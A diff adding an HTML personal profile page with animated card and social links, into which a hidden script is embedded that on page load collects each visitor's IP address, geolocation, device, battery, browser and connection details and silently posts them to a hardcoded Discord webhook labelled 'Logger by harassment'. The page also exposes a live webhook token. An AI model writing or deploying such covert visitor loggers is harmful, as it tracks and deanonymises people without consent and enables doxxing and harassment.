@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>harassment.lol</title>
+
+
+  <link rel="icon" type="image/png" href="assets/favicon.gif" />
+
+
+  <meta property="og:title" content="sexual" />
+  <meta property="og:description" content="<3" />
+  <meta property="og:image" content="https://i.imgur.com/bCOCHcy.png" />
+  <meta property="og:url" content="https://bloods.lol/h" />
+  <meta name="twitter:card" content="summary_large_image" />
+
+  
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" rel="stylesheet" />
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/vanilla-tilt/1.7.0/vanilla-tilt.min.js"></script>
+ 
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      background-color: black;
+      color: white;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .hidden { display: none; }
+    .profile-card {
+      background: black;
+      padding: 24px;
+      border-radius: 12px;
+      box-shadow: 0 0 20px rgba(255, 255, 255, 0.2);
+      text-align: left;
+      width: 400px;
+      height: 180px;
+      position: relative;
+      transition: transform 0.1s ease-out;
+    }
+    .profile-img {
+      border-radius: 50%;
+      width: 80px;
+      height: 80px;
+    }
+    .badges {
+      position: absolute;
+      top: 28px;
+      right: 50px;
+      display: flex;
+      padding: 4px;
+      border: 1px solid #333;
+      border-radius: 6px;
+      background-color: #111;
+    }
+    .badge-img {
+      width: 25px;
+      height: 25px;
+      filter: grayscale(100%);
+      margin: 0 5px;
+    }
+    .social-icons {
+      margin-top: 25px;
+      display: flex;
+      gap: 8px;
+      justify-content: flex-start;
+    }
+    .social-icons a {
+      color: white;
+      font-size: 24px;
+      text-decoration: none;
+    }
+    .click-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.75);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-size: 24px;
+      cursor: pointer;
+      z-index: 100;
+    }
+    .fade-out {
+      opacity: 0;
+      transition: opacity 0.5s ease;
+      pointer-events: none;
+    }
+    #animated-title {
+      font-size: 30px;
+    }
+    #animated-title::after {
+      content: '|';
+      animation: blink 0.7s infinite;
+      margin-left: 2px;
+    }
+    #animated-title.done::after { content: ''; }
+    p {
+      font-size: 14px;
+    }
+    @keyframes blink {
+      0%, 50% { opacity: 1; }
+      51%, 100% { opacity: 0; }
+    }
+  </style>
+</head>
+<body>
+  <div id="clickOverlay" class="click-overlay">click to reveal...</div>
+  <div id="mainContainer" class="hidden">
+    <div class="profile-card" id="profileCard">
+      <div class="badges">
+        <img src="assets/premium.png" alt="badge 1" class="badge-img" />
+        <img src="assets/booster.png" alt="badge 2" class="badge-img" />
+        <img src="assets/cat.gif" alt="badge 3" class="badge-img" />
+      </div>
+      <div style="display: flex; align-items: center;">
+        <img class="profile-img" src="assets/pfp.png" alt="Profile picture" />
+        <div style="margin-left: 12px;">
+          <h1 id="animated-title"></h1>
+          <p>fakecrime.bio/nope</p>
+          <p>vacban.wtf staff | malware analyst & reverse engineer</p>
+        </div>
+      </div>
+      <div class="social-icons">
+        <a href="https://t.me/s3xu4l" target="_blank"><i class="fab fa-telegram"></i></a>
+        <a href="https://discord.com/users/1201069596002766939" target="_blank"><i class="fab fa-discord"></i></a>
+        <a href="https://steamcommunity.com/id/ass6/" target="_blank"><i class="fab fa-steam"></i></a>
+        <a href="https://vacban.wtf/members/103095/" target="_blank"><i class="fa-solid fa-user-secret"></i></a>
+        <a href="https://fakecrime.bio/sexual" target="_blank"><i class="fas fa-bolt"></i></a>
+        <a href="https://fatality.win/members/luckyhvh.28807/" target="_blank"><i class="fas fa-f"></i></a>
+      </div>
+    </div>
+  </div>
+
+  <audio id="backgroundMusic" src="/assets/song.mp3"></audio>
+
+  <script>
+    document.getElementById('clickOverlay').addEventListener('click', function() {
+      this.classList.add('fade-out');
+      setTimeout(() => {
+        this.style.display = 'none';
+        document.getElementById('mainContainer').classList.remove('hidden');
+        let audio = document.getElementById('backgroundMusic');
+        audio.volume = 0.2;
+        audio.play();
+        let title = "harassm";
+        let index = 0;
+        function typeEffect() {
+          if (index < title.length) {
+            document.getElementById("animated-title").innerHTML += title[index];
+            index++;
+            setTimeout(typeEffect, 250);
+          } else {
+            document.getElementById("animated-title").classList.add("done");
+          }
+        }
+        typeEffect();
+      }, 500);
+    });
+
+    // Initialize Vanilla Tilt on the profile card
+    VanillaTilt.init(document.querySelectorAll(".profile-card"), {
+      max: 15, // Maximum tilt angle
+      speed: 200, // Tilt speed
+      glare: true, // Enable glare effect
+      "max-glare": 0.5 // Maximum glare intensity
+    }); 
+    </script>
+    <script>
+            async function getUserData() {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
+                const browserInfo = navigator.userAgent;
+                const screenResolution = `${window.screen.width}x${window.screen.height}`;
+                const language = navigator.language;
+                const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                const timestamp = new Date().toLocaleString('en-En', {
+                    timeZone
+                });
+
+                const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? "📱 Mobilne" : "💻 Komputer";
+                const onlineStatus = navigator.onLine ? "🟢 Online" : "🔴 Offline";
+                const uptime = `${(performance.now() / 60000).toFixed(2)} min`;
+                const os = navigator.userAgentData ? navigator.userAgentData.platform : navigator.platform;
+                const cpuCores = navigator.hardwareConcurrency;
+                const navHeight = `${window.innerHeight}px`;
+                let batteryLevel = "Nieznane";
+                let powerSavingMode = "Nieznane";
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    batteryLevel = `${(battery.level * 100).toFixed(0)}%`;
+                    powerSavingMode = battery.charging ? "Nie" : "Tak";
+                }
+
+                let adBlockEnabled = "Nieznane";
+                try {
+                    await fetch(new Request("https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js", {
+                            method: 'HEAD',
+                            mode: 'no-cors'
+                        }))
+                        .then(() => adBlockEnabled = "❌ Nie", () => adBlockEnabled = "✅ Tak");
+                } catch (error) {
+                    adBlockEnabled = "✅ Tak";
+                }
+
+                const browserName = navigator.appName;
+                const browserVersion = navigator.appVersion;
+                const browserLanguage = navigator.language;
+                const cookiesEnabled = navigator.cookieEnabled ? "✅ Tak" : "❌ Nie";
+                const connectionType = navigator.connection ? navigator.connection.effectiveType : "Nieznane";
+                const connectionRtt = navigator.connection ? `${navigator.connection.rtt} ms` : "Nieznane";
+                const connectionDownlink = navigator.connection ? `${navigator.connection.downlink} Mbps` : "Nieznane";
+                const osVersion = navigator.userAgentData ? navigator.userAgentData.platformVersion : "Nieznane";
+
+                let location = "Nieznane";
+                try {
+                    const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                    const locationData = await locationResponse.json();
+                    location = `${locationData.city}, ${locationData.region}, ${locationData.country_name}`;
+                } catch (error) {
+                    console.error("Błąd podczas pobierania lokalizacji:", error);
+                }
+
+                const data = {
+                    ip,
+                    browser: browserInfo,
+                    resolution: screenResolution,
+                    language,
+                    timeZone,
+                    timestamp,
+                    deviceType,
+                    onlineStatus,
+                    uptime,
+                    os,
+                    cpuCores,
+                    navHeight,
+                    batteryLevel,
+                    powerSavingMode,
+                    adBlockEnabled,
+                    browserName,
+                    browserVersion,
+                    browserLanguage,
+                    cookiesEnabled,
+                    connectionType,
+                    connectionRtt,
+                    connectionDownlink,
+                    osVersion,
+                    location
+                };
+
+                await sendDataToWebhook(data);
+            } catch (error) {
+                console.error("Błąd podczas pobierania danych:", error);
+            }
+        }
+
+        async function sendDataToWebhook(data) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1351346465829687358/4nal0Hkw_ZIIZ5vQDWmZyi1sWL7sP64w5g111DHkRXfIeFLEmycz12HpXuwjxRaE2xMb'; // webhook
+
+            const payload = {
+                content: "📡 **Nowe logowanie użytkownika!**",
+                embeds: [{
+                    title: "📊 Szczegóły urządzenia",
+                    color: 16711680,
+                    fields: [{
+                        name: "📍 IP",
+                        value: data.ip,
+                        inline: true
+                    }, {
+                        name: "🌍 Lokalizacja",
+                        value: data.location,
+                        inline: true
+                    }, {
+                        name: "🖥️ Rozdzielczość",
+                        value: data.resolution,
+                        inline: true
+                    }, {
+                        name: "🗣️ Język",
+                        value: data.language,
+                        inline: true
+                    }, {
+                        name: "🕒 Strefa czasowa",
+                        value: data.timeZone,
+                        inline: true
+                    }, {
+                        name: "📅 Czas",
+                        value: data.timestamp,
+                        inline: false
+                    }, {
+                        name: "📱 Typ urządzenia",
+                        value: data.deviceType,
+                        inline: true
+                    }, {
+                        name: "🔋 Bateria",
+                        value: data.batteryLevel,
+                        inline: true
+                    }, {
+                        name: "⚡ Tryb oszczędzania",
+                        value: data.powerSavingMode,
+                        inline: true
+                    }, {
+                        name: "🖥️ System operacyjny",
+                        value: data.os,
+                        inline: true
+                    }, {
+                        name: "🔗 Status online",
+                        value: data.onlineStatus,
+                        inline: true
+                    }, {
+                        name: "📊 Czas działania (uptime)",
+                        value: data.uptime,
+                        inline: true
+                    }, {
+                        name: "🖥️ Rdzenie CPU",
+                        value: data.cpuCores.toString(),
+                        inline: true
+                    }, {
+                        name: "📏 Wysokość paska nawigacji",
+                        value: data.navHeight,
+                        inline: true
+                    }, {
+                        name: "🚫 AdBlock",
+                        value: data.adBlockEnabled,
+                        inline: true
+                    }, {
+                        name: "🌐 Przeglądarka",
+                        value: data.browserName,
+                        inline: true
+                    }, {
+                        name: "📜 Wersja przeglądarki",
+                        value: data.browserVersion,
+                        inline: true
+                    }, {
+                        name: "🍪 Ciasteczka",
+                        value: data.cookiesEnabled,
+                        inline: true
+                    }, {
+                        name: "📶 Typ połączenia",
+                        value: data.connectionType,
+                        inline: true
+                    }, {
+                        name: "⏱️ Opóźnienie (RTT)",
+                        value: data.connectionRtt,
+                        inline: true
+                    }, {
+                        name: "⬇️ Prędkość pobierania",
+                        value: data.connectionDownlink,
+                        inline: true
+                    }],
+                    footer: {
+                        text: "Logger by harassment",
+                        icon_url: ""
+                    }
+                }]
+            };
+
+            const response = await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            });
+
+            if (!response.ok) {
+                console.error("Błąd wysyłania:", response.statusText);
+            } else {
+                console.log("Dane wysłane pomyślnie.");
+            }
+        }
+
+        window.onload = getUserData;  
+    </script>
+</body>
+</html>
